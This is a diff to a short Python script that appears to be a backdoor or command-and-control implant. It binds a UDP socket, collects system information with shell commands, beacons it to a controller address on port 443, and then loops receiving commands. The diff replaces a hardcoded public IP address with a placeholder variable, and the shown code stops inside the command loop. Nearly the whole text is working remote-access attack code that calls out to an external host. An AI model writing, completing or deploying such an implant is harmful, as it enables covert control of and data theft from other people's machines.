@@ -1,5 +1,6 @@
 #!/usr/bin/python3
 import sys, socket, subprocess
+controllerIP = 'whatever you want man'
 try:
 	sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
 	sock.bind(('0.0.0.0', 5151))
@@ -8,7 +9,7 @@ try:
 	except subprocess.CalledProcessError:
 		uname = subprocess.check_output('ver', shell=True).lstrip()
 			
-	sock.sendto(uname, ('68.183.187.166', 443))
+	sock.sendto(uname, (controllerIP, 443))
 	while True:
 		command = sock.recvfrom(4096)
 		#print(command)
